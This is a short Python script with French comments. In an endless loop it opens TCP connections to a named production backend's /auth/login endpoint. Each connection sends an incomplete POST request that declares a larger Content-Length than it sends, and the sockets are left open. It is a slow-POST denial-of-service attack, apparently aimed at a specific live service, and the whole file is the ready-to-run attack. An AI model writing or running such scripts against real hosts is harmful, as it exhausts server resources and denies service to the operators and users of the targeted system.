import socket
import time
SERVER_IP = "travelas-backend-production.up.railway.app"
SERVER_PORT = 80
PATH = "/auth/login"
PARTIAL_POST_DATA = b"nom=valeur&"  # Encodage en bytes pour l'envoi réseau

PARTIAL_POST_HEADERS = f"POST {PATH} HTTP/1.1\r\nHost: {SERVER_IP}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ".encode('utf-8')

CONTENT_LENGTH = len(PARTIAL_POST_DATA)
INCOMPLETE_CONTENT_LENGTH = CONTENT_LENGTH + 10

PARTIAL_REQUEST = PARTIAL_POST_HEADERS + str(INCOMPLETE_CONTENT_LENGTH).encode('utf-8') + b"\r\n\r\n" + PARTIAL_POST_DATA
start_time = time.time()
print(f"Début de l'envoi de la requête : {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}")
while(True):
    try:
    # Créer un socket TCP
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connecter au serveur
        client_socket.connect((SERVER_IP, SERVER_PORT))

    # Envoyer la requête partielle
        client_socket.sendall(PARTIAL_REQUEST)
        end_time = time.time()
        duration = end_time - start_time
        print(f"Requête partielle envoyée à {SERVER_IP}:{SERVER_PORT}, temps: {duration:.4f} secondes")
        # Recevoir une partie de la réponse (la quantité dépendra du serveur et de la fermeture de la connexion)
        response = client_socket.recv(4096)  # Recevoir jusqu'à 4096 bytes de données
        print("\nRéponse partielle du serveur :")
        if response:
            try:
                print(response.decode('utf-8'))
            except UnicodeDecodeError:
                print(response) # Afficher les bytes bruts si le décodage UTF-8 échoue
        else:
            print("Aucune donnée reçue du serveur.")
    except socket.error as e:
        end_time = time.time()
        duration = end_time - start_time
        print(f"Erreur de socket: {e}, temps: {duration:.4f} secondes")
        continue
    finally:
        end_time = time.time()
        duration = end_time - start_time
        print(f'finaly, temps: {duration:.4f} secondes')
        continue
    # Fermer la connexion
    #if 'client_socket' in locals() and client_socket is not None:
     #   client_socket.close()
	#print('finaly')
       # continue
